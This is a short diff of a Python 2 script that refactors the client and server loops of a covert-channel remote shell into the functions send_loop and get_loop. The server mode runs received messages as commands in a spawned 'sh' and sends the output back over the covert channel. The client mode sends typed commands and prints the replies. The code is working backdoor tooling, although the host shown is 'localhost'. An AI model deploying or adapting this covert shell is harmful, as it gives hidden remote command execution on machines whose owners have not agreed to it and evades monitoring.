@@ -34,25 +34,32 @@ def get_covert(lead):
         else:
             return get_covert(lead)
 
+def send_loop():
+    while True:
+        try:
+            mesg = raw_input('>>$ ')
+        except EOFError:
+            mesg = '\n'
+        send_covert('M:', mesg, 'localhost')
+        if mesg in ('\n', 'end', 'exit', 'quit'):
+            break
+        print(get_covert('S:'))
+
+def get_loop():
+    while True:
+        shell = Popen(args=['sh'], stdin=PIPE, stdout=PIPE)
+        mesg = get_covert('M:')
+        if mesg in ('\n', 'end', 'exit', 'quit'):
+            break
+        shell.stdin.write(mesg + '\n')
+        shell.stdin.write('exit\n')
+        val = shell.stdout.read()
+        send_covert('S:', val, 'localhost')
+
+
 if __name__ == '__main__':
     import sys
     if sys.argv[1] == '-c':
-        while True:
-            try:
-                mesg = raw_input('>>$ ')
-            except EOFError:
-                mesg = '\n'
-            send_covert('M:', mesg, 'localhost')
-            if mesg in ('\n', 'end', 'exit', 'quit'):
-                break
-            print(get_covert('S:'))
+        send_loop()
     elif sys.argv[1] == '-s':
-        while True:
-            shell = Popen(args=['sh'], stdin=PIPE, stdout=PIPE)
-            mesg = get_covert('M:')
-            if mesg in ('\n', 'end', 'exit', 'quit'):
-                break
-            shell.stdin.write(mesg + '\n')
-            shell.stdin.write('exit\n')
-            val = shell.stdout.read()
-            send_covert('S:', val, 'localhost')
+        get_loop()
